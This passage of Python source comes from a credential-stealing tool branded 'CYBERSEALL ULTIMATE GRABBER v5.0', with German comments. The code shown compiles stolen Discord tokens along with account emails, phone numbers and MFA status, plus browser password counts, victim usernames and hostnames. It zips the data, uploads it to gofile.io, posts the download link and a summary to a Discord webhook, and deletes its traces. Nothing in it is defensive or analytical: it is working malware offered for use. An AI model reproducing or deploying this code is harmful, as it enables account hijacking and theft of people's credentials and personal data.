                            f.write(f"💎 Nitro: {token_info.get('has_nitro', False)} ({token_info.get('nitro_days_left', 0)} days left)\n")
                            f.write(f"🛡️ MFA: {token_info.get('mfa_enabled', False)}\n")
                            f.write(f"✅ Verified: {token_info.get('verified', False)}\n")
                            f.write(f"⭐ Premium: {token_info.get('premium_type', 0)}\n")
                            f.write(f"🔐 Token: {token_info['token']}\n")
                            f.write("-" * 50 + "\n\n")
                
                # Erstelle Gesamtstatistik
                with open(os.path.join(self.d, "GRABBER_STATISTICS.txt"), "w", encoding="utf-8") as f:
                    f.write("🔥 CYBERSEALL ULTIMATE GRABBER v5.0 🔥\n")
                    f.write("=" * 60 + "\n\n")
                    f.write("📊 FINAL STATISTICS:\n")
                    f.write(f"🔑 Browser Passwords: {len(self.p)}\n")
                    f.write(f"🎯 Raw Tokens: {len(set(self.t))}\n")
                    f.write(f"✅ Valid Tokens: {len(self.vt)}\n")
                    f.write(f"📁 Keyword Files: {len(self.f)}\n\n")
                    f.write(f"💻 Target: {getpass.getuser()}@{os.getenv('COMPUTERNAME', 'Unknown')}\n")
                    f.write(f"🌐 Platform: {platform.platform()}\n")
                    f.write(f"⏰ Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write("=" * 60 + "\n")
            except:
                pass
            
            # Packe alle Dateien in ZIP
            with zipfile.ZipFile(self.zf, 'w', zipfile.ZIP_DEFLATED) as zf:
                for root, dirs, files in os.walk(self.d):
                    for file in files:
                        if not file.endswith('.zip'):
                            fp = os.path.join(root, file)
                            arc_name = os.path.relpath(fp, self.d)
                            zf.write(fp, arc_name)
            
            # Upload zu GoFile
            files = {"file": open(self.zf, "rb")}
            resp = requests.post("https://store1.gofile.io/uploadFile", files=files, timeout=30)
            files["file"].close()
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("status") == "ok":
                    self.link = data["data"]["downloadPage"]
                else:
                    self.link = "Upload failed"
            else:
                self.link = "Upload failed"
            
            try:
                os.remove(self.zf)
            except:
                pass
        except:
            self.link = "Upload failed"

    def send(self):
        try:
            # Zähle alle gesammelten Daten
            total_passwords = len(self.p)
            total_tokens = len(set(self.t))
            valid_tokens = len(self.vt)
            total_files = len(self.f)
            
            # Erstelle eine einzige umfassende Embed
            embed_fields = [
                {
                    "name": "💎 ULTIMATE RESULTS",
                    "value": f"```🔑 {total_passwords} Browser Passwords\n🎯 {total_tokens} Raw Tokens\n✅ {valid_tokens} Valid Tokens\n📁 {total_files} Keyword Files```",
                    "inline": False
                },
                {
                    "name": "💻 Target System",
                    "value": f"```👤 {getpass.getuser()}\n🖥️ {os.getenv('COMPUTERNAME', 'Unknown')}\n🌐 {platform.platform()}```",
                    "inline": False
                }
            ]
            
            # Füge Token-Informationen direkt in die Hauptembed ein
            if len(self.vt) > 0:
                for i, token_info in enumerate(self.vt[:3]):  # Max 3 Token in Hauptembed
                    username = token_info.get('username', 'Unknown')
                    discriminator = token_info.get('discriminator', '0000')
                    email = token_info.get('email', 'Hidden')
                    phone = token_info.get('phone', 'None')
                    has_nitro = token_info.get('has_nitro', False)
                    nitro_days = token_info.get('nitro_days_left', 0)
                    mfa = token_info.get('mfa_enabled', False)
                    verified = token_info.get('verified', False)
                    premium = token_info.get('premium_type', 0)
                    token = token_info['token']
                    
                    embed_fields.append({
                        "name": f"🎯 DISCORD TOKEN #{i+1}",
                        "value": f"```👤 {username}#{discriminator}\n📧 {email}\n📱 {phone}\n💎 Nitro: {has_nitro} ({nitro_days} days)\n🛡️ MFA: {mfa} | Verified: {verified}\n🔐 {token[:60]}...```",
                        "inline": False
                    })
            
            # Zeige Browser-Statistiken
            if total_passwords > 0:
                # Gruppiere Passwörter nach Browser
                browser_stats = {}
                for pwd_entry in self.p:
                    browser = pwd_entry.split(" |")[0]
                    if browser not in browser_stats:
                        browser_stats[browser] = 0
                    browser_stats[browser] += 1
                
                browser_summary = []
                for browser, count in sorted(browser_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    browser_summary.append(f"{browser}: {count}")
                
                embed_fields.append({
                    "name": "🌐 BROWSER BREAKDOWN",
                    "value": f"```{chr(10).join(browser_summary)}```",
                    "inline": False
                })
            
            # Download-Link
            embed_fields.append({
                "name": "📁 DOWNLOAD ALL DATA",
                "value": f"[**🔥 CLICK HERE TO DOWNLOAD 🔥**]({self.link if hasattr(self, 'link') else 'Upload failed'})",
                "inline": False
            })
            
            embed = {
                "embeds": [{
                    "title": "🔥 CYBERSEALL ULTIMATE GRABBER v5.0 🔥",
                    "description": "**MAXIMUM STEALTH DATA EXTRACTION COMPLETE**",
                    "color": 0xff0000,
                    "fields": embed_fields,
                    "footer": {"text": "Cyberseall ULTIMATE v5.0 - Enhanced Browser Stealer + Session Hijacker"},
                    "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime()),
                    "thumbnail": {"url": "https://i.imgur.com/RL8Y2R8.png"}
                }]
            }
            
            requests.post(self.w, json=embed, timeout=10)
            
        except:
            pass

    def cleanup(self):
        try:
            time.sleep(1)
            if os.path.exists(self.d):
                shutil.rmtree(self.d, ignore_errors=True)
        except:
            pass

# WEBHOOK_PLACEHOLDER wird durch die Mini-Payload ersetzt
if __name__ == "__main__":
    CyberseallGrabber("WEBHOOK_PLACEHOLDER") 
